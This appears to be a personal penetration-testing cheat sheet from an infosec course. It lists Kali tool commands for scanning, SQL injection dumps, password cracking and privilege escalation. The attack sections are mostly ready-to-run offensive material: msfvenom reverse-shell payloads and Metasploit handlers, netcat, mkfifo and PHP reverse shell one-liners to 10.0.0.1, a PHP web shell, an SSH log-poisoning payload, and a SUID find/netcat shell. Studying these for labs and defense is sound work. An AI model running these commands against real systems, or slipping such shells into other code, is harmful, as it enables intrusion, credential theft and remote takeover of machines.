# Notes

## Scanning

### Local IP address

``` bash
ip a
hostname -I
ME=$(hostname -I | xargs)
```

### Network scanning

#### Nmap

Examples:

```bash
# Network scan
nmap -sn "$ME/24"
TARGET=192.168..#

# Target scan
nmap -A -p- $TARGET
```

Resources:

* `nmap`
* https://tools.kali.org/information-gathering/nmap
* https://nmap.org/book/man.html

### Web server scanning

#### Nikto2

Examples:

```bash
nikto -host $TARGET:80
nikto -Display 134 -ask no -host $TARGET:80
```

Resources:

* `nikto`
* `nikto -Help`
* https://tools.kali.org/information-gathering/nikto
* https://cirt.net/nikto2-docs/usage.html

#### WhatWeb

Examples:

```bash
whatweb $TARGET:80
```

Resources:

* `whatweb`
* `whatweb --help`
* https://tools.kali.org/web-applications/whatweb
* https://www.morningstarsecurity.com/research/whatweb

#### WPScan

Examples:

```bash
wpscan --url http://$TARGET:80/wordpress/

# password brute forcer
wpscan --passwords wordlist2.txt --max-threads 4 --url http://$TARGET:80/wordpress/
```

Resources:

* `wpscan --help`
* `wpscan --hh`
* https://tools.kali.org/web-applications/wpscan
* https://wpscan.org/

### File/directory enumeration

#### Wordlists

```bash
# collection in Kali
/usr/share/wordlists/

# Good results
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirb/big.txt
```

Resources:

* https://tools.kali.org/password-attacks/wordlists
* https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project#The_DirBuster_Lists
* https://tools.kali.org/web-applications/dirb

#### GoBuster

Examples:

```bash
gobuster dir --expanded --wordlist ~/infosec-lecture/toolbox/misc/wordlist-lecture.txt --url $TARGET:80

gobuster dir --expanded --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --addslash --url $TARGET:80
```

Resources:

* `gobuster dir --help`
* https://tools.kali.org/web-applications/gobuster
* https://github.com/OJ/gobuster



## Attacks

### Metasploit

#### MSFvenom

Examples:

```bash
msfvenom -p php/meterpreter/reverse_tcp > shell.php
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8080
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8080 -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp -f python

```

Resources:

* `msfvenom -h`
* https://www.offensive-security.com/metasploit-unleashed/msfvenom/
* https://superuser-ltd.github.io/2017/msfvenom-payloads/

#### MSFconsole

Examples:

```bash
msfconsole
> use exploit/multi/handler
> set payload linux/x86/meterpreter/reverse_tcp
> options
> set lhost 192.168.0.1
> set rport 8080
> exploit

msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost $ME; set lport 8080; exploit"

msfconsole
> use exploit/unix/webapp/wp_admin_shell_upload
> options
> set rhosts $TARGET
> set targeturi wordpress
> set username admin
> set password XYZ
```

### SQL injections

#### sqlmap

```bash
sqlmap -u $TARGET/index.php --data "user=1&password=1" --risk=3

sqlmap -u $TARGET/index.php --data "user=1&password=1" -o --batch --risk=3 --not-string="Incorrect credentials"

... --dbs
... -D db --tables
... -D db -T users --columns
... -D db -T users --dump

```

Resources:

* `sqlmap -h`
* `sqlmap -hh`
* https://tools.kali.org/vulnerability-analysis/sqlmap
* https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Password attacks

#### CeWL

Examples:

```bash
cewl -w wordlist.txt http://$TARGET:80/wordpress/
```

Resources:

* `cewl --help`
* https://tools.kali.org/password-attacks/cewl
* https://digi.ninja/projects/cewl.php#usage

#### John the Ripper

Custom rules (`/etc/john/john.conf`):

```bash
[List.Rules:WordpressCustom]
rc$[1-6]$[1-6]
```

Examples:

```bash
john --wordlist=wordlist.txt --rules:WordpressCustom --stdout > wordlist2.txt

unshadow passwd shadow > password.txt
john password.txt

putty2john private_root_key.ppk > p2j.txt
john --wordlist=wordlist.txt p2j.txt
```

Resources:

* `john`
* https://tools.kali.org/password-attacks/john
* https://www.openwall.com/john/doc/
* https://www.openwall.com/john/doc/RULES.shtml

#### THC-Hydra

Resources:

* `hydra`
* `hydra -h`
* https://tools.kali.org/password-attacks/hydra
* https://github.com/vanhauser-thc/thc-hydra

### Interactive shells

#### Reverse shells

Examples:

```bash
nc -e /bin/sh 10.0.0.1 1234
nc -e /bin/bash 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Resources:

* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

#### Web shells

Examples:

```php
<?php system($_GET['cmd']); ?>
```

```bash
msfconsole
> use exploit/multi/script/web_delivery
> options
> set target 1
> set payload php/meterpreter/reverse_tcp
> set lhost $ME
> set srvport 8080
> exploit

msfconsole -x "use exploit/multi/script/web_delivery; set target 1; set payload php/meterpreter/reverse_tcp; set lhost $ME; exploit"

> sessions -i 1
```

Resources:

* Kali: `/usr/share/webshells/`

### Log poisoning

Write to `auth.log`:

```bash
ssh '<?php system($_GET["c"]); ?>'@$TARGET
```

Log file location: `/var/log/auth.log`

Goal: Reverse shell

Resources:

* https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

### Privilege Escalation

Standard tools and techniques:

```bash
whoami
uname -a

history

# cron
cd /etc/cron.d/

# SUID
find / -perm -u=s -type f 2>/dev/null

# root processes
ps -aux | grep root

# exploit search
searchsploit Linux Kernel 2.6.24
```

SUID examples:

```bash
touch /tmp/a
find /tmp/a -exec sh -i \;
find /tmp/a -exec netcat -e /bin/sh $ME 8000 \;

which cp
ls -al /bin/cp
chmod u+s /bin/cp

nmap --interactive
> !sh
```

Automated scripts:

* `LinEnum.sh`
* `linuxprivchecker.py`
* `linuxprivchecker_python3.py`

Resources:

* https://pentestlab.blog/2017/09/25/suid-executables/
* https://payatu.com/guide-linux-privilege-escalation/
* https://github.com/AlessandroZ/LaZagne
* https://github.com/rek7/mXtract



## Binaries

### Tools

* `file`
* `strings`
* `ltrace`
* `strace`
* `radare2`
* `gdb`

## Forensics

### Hex editors

* Command line: `xxd`
* Editor of choice: [wxHexEditor](https://www.wxhexeditor.org/)
  * Extract data using “Set Selection Block Start/End” > “Save As Dump”



## Misc

### Upgrading TTY

```
# (local)
echo $TERM  # xterm-256color
stty size   # 24 80

# remote
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
# ctrl+z
stty raw -echo
fg
reset
stty rows 24 cols 80
```

### Bash tools

```bash
bind 'set completion-ignore-case on'
alias ll="ls -lah"
```



### String-related resources

* String conversion:
  * http://www.utilities-online.info/base64/
  * https://ringzer0ctf.com/tool
* Hash reversal:
  * https://crackstation.net/
  * https://hashes.org/search.php
  * https://md5decrypt.net/en/
  * https://hashkiller.co.uk/Cracker/MD5

### Kali settings

* Settings
  * Keyboard > Add Custom Shortcut > `gnome-terminal` / `Ctrl+Alt+T`
  * Power > Automatic suspend: off
* Dash to Dock settings 
  * Panel mode: extend to the screen edge
  * Intelligent autohide: off